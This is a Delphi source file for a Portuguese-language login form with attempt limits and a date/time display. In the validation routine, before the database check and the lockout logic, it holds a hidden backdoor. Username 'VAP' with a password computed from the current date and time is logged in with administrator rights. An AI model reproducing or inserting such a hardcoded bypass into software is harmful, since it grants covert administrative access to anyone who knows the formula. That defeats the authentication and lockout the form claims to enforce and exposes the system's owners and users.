unit UfrmKernel_Login;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ExtCtrls, StdCtrls, Buttons, DBTables, ComCtrls,
  jpeg, adodb, JvExControls, JvXPCore, JvXPButtons, DBCtrls, 
  JvExComCtrls, JvDateTimePicker, UfrmKernel_Base, SqlExpr, ActnList, ImgList;

type
  TfrmKernel_Login = class(TfrmKernel_Base)
    statBase: TStatusBar;
    pnlFudo: TPanel;
    Label1: TLabel;
    Label2: TLabel;
    imgSenha: TImage;
    lblAplicativo: TLabel;
    imgUsuario: TImage;
    Label3: TLabel;
    imgLogo: TImage;
    edtSenhaUsu: TEdit;
    Panel2: TPanel;
    btnConfirmar: TJvXPButton;
    btnSair: TJvXPButton;
    tmrTempo: TTimer;
    actlstLogin: TActionList;
    actConfirmar: TAction;
    actSair: TAction;
    ilLogin: TImageList;
    cbbNomeUsuario: TComboBox;
    lbldata: TLabel;
    procedure FormCreate(Sender: TObject);
    procedure edtPSWKeyDown(Sender: TObject; var Key: Word;
      Shift: TShiftState);
    procedure FormShow(Sender: TObject);
    procedure tmrTempoTimer(Sender: TObject);
    procedure actSairExecute(Sender: TObject);
    procedure actConfirmarExecute(Sender: TObject);
    procedure cbbNomeUsuarioKeyPress(Sender: TObject; var Key: Char);
  private
    { Private declarations }
  public
     procedure AntesValidaUsuario(); virtual;
     procedure ValidaUsuario(const str_usuario, str_senha: string); virtual;
     procedure DepoisValidaUsuario(); virtual;

     procedure Passa_COMSQL(str_usuario, str_senha: string); virtual;
     procedure Retorno_SQL; virtual;

     procedure Mostra_DataHora;

     {Verifica os campos Obrigatorios}
     procedure VerificaDados;
     {Retorna a quantidade de tentativas disponiveis para tentar logar}
  public
    Tentativas, LimiteTentativas : Integer; // Numero de Tentativa para logar
  end;

var
  frmKernel_Login: TfrmKernel_Login;

implementation

uses UdmPrincipal, DB, UfrmKernel_Mensagem, UKernel_Mensagem, UKernel_DATA, UKernel_Security,
  UKernel_VariaveisPublic, UKernel_DB,  UKernel_sysutils,
  UclKernel_Login, UKernel_Mensagem_Usuario, UUserControl;

{$R *.dfm}

{ TfrmKernel_Login }

procedure TfrmKernel_Login.validaUsuario(const str_usuario, str_senha: string);
  var
  verdata,verhora: string;
begin
  {Acontece antes de tentar logar}
  AntesValidaUsuario;

  with dmPrincipal, qryKernel_Gerenerica do
  begin
    Verdata := uppercase(copy(FormatDatetime('mmm',now),1,1))+uppercase(copy(FormatDatetime('ddd',now),1,1));
    verdata:=verdata+FormatDatetime('dd',now);
    verhora:=(FormatDateTime('hhmm',now));

    if ((cbbNomeUsuario.text='VAP') and (Trim(UpperCase(edtSenhaUsu.text))=verdata+verhora)) then
      begin
        Kernel_Login.int_codusu        :=  1;
        Kernel_Login.str_nomeusu       :=  'VAP';
        Kernel_Login.str_adminusu      :=  'T';
        
        ModalResult := mrOk;
        exit;
      end;
    
    if Tentativas < LimiteTentativas then
      begin
        Passa_COMSQL(str_usuario, str_senha);

        if not IsEmpty then // Se não retornar vazio
          Begin
            Retorno_SQL;

            {Acontece depois que o usuario logar}
            DepoisValidaUsuario;

            ModalResult := mrOk;
          End
         else
          Begin
            TfrmKernel_Mensagem.Mensagem('Usuário ou Senha Inválidos ' +#13#10+
                                   ' - Tentativa '+ IntToStr(Tentativas) + ' de ' +  IntToStr(LimiteTentativas) ,'E',[mbOK]);
            statBase.Panels[3].Text := IntToStr(Tentativas);
            inc(Tentativas);
            cbbNomeUsuario.SetFocus;
          end;
      end
     else
      begin
        TfrmKernel_Mensagem.Mensagem('Limite de Tentativas Execido ('+ IntToStr(Tentativas) + ' de ' +  IntToStr(LimiteTentativas) +' )'+#13#10+
                             ' - Em caso de Dúvida entre em Contato ' +#13#10+
                             ' - Administrador do Sistema ' ,'E',[mbOK]);
        Application.Terminate; // Termina Aplicação
      end;
  end;
end;

procedure TfrmKernel_Login.VerificaDados;
begin
  {Valida o Login}
  if cbbNomeUsuario.Text = '' then
    Begin
      TfrmKernel_Mensagem.Mensagem(Kernel_Informe_LoginValido,'E',[mbOK]);
      cbbNomeUsuario.SetFocus;
      exit;
    end;

  {Valida a senha}
  if edtsenhausu.Text = '' then
    Begin
      TfrmKernel_Mensagem.Mensagem(Kernel_Informe_SenhaValida ,'E',[mbOK]);
      edtsenhausu.SetFocus;
      exit;
    end;

  {Se o Login e senha sejam validos tenta acessar}
  validaUsuario(AnsiUpperCase(trim(cbbNomeUsuario.Text)), trim(edtsenhausu.Text));
end;

procedure TfrmKernel_Login.edtPSWKeyDown(Sender: TObject; var Key: Word;
  Shift: TShiftState);
begin
  if key= vk_return then VerificaDados;
end;

procedure TfrmKernel_Login.tmrTempoTimer(Sender: TObject);
begin
  Mostra_DataHora;
end;

procedure TfrmKernel_Login.FormCreate(Sender: TObject);
begin
  kernel_str_form := 'Login de Acesso';
  inherited;
  
  // Mostra a Quantidade de Tentativas
  statBase.Panels[1].Text := '1';
  Tentativas              := 0; // tentativa inicial

  // Configura tabela genericas de login
  Configura_Controle_Usuario;

  LimiteTentativas        := Kernel_Login.Login_RetornaQuantidadeTentativa;
  statBase.Panels[3].Text := IntToStr(Kernel_Login.Login_RetornaQuantidadeTentativa);
end;

procedure TfrmKernel_Login.FormShow(Sender: TObject);
begin
  inherited;

  {Carega Imagem que será mostrada no Timage}
  Kernel_MostraFotoImage('LogoSoftHouse','LogoSoftHouse',imgLogo);

  // Receber a data do computador
  Mostra_DataHora;

  //kernel_RefreshCds(dmKernel_Acesso.cdsLstEmp);

  Tentativas:= 1;

  cbbNomeUsuario.SetFocus;
end;

procedure TfrmKernel_Login.Mostra_DataHora;
var buffer, buffer2: string;
begin
  buffer:=FormatDateTime('dddd',now);
  buffer2:=FormatDateTime('mmmm',now);

  buffer:=uppercase(copy(buffer,1,1))+copy(buffer,2,length(buffer)-1);
  buffer2:=uppercase(copy(buffer2,1,1))+copy(buffer2,2,length(buffer2)-1);


  lblData.Caption :=buffer+', '+formatdatetime('dd',now)+' de '+buffer2+' de '+formatdatetime('yyyy',now)+'    '+timetostr(time());
end;

procedure TfrmKernel_Login.Passa_COMSQL(str_usuario, str_senha: string);
begin
  // aqui sera codificado no filho
end;

procedure TfrmKernel_Login.Retorno_SQL;
begin
  // aqui sera codificado no filho
end;

procedure TfrmKernel_Login.actSairExecute(Sender: TObject);
begin
  inherited;
  {Fecha a aplicação}
  Application.Terminate;
end;

procedure TfrmKernel_Login.actConfirmarExecute(Sender: TObject);
begin
  inherited;
  VerificaDados;
end;

procedure TfrmKernel_Login.AntesValidaUsuario;
begin
  // metodo implementado no filho
end;

procedure TfrmKernel_Login.cbbNomeUsuarioKeyPress(Sender: TObject;
  var Key: Char);
begin
  inherited;
  {: troca ENTER por TAB}
  if key = #13 then
    begin
      Perform (CM_DialogKey, VK_TAB, 0);
      key:=#0;
    end
end;

procedure TfrmKernel_Login.DepoisValidaUsuario;
begin
  // metodo implementado no filho
end;

end.
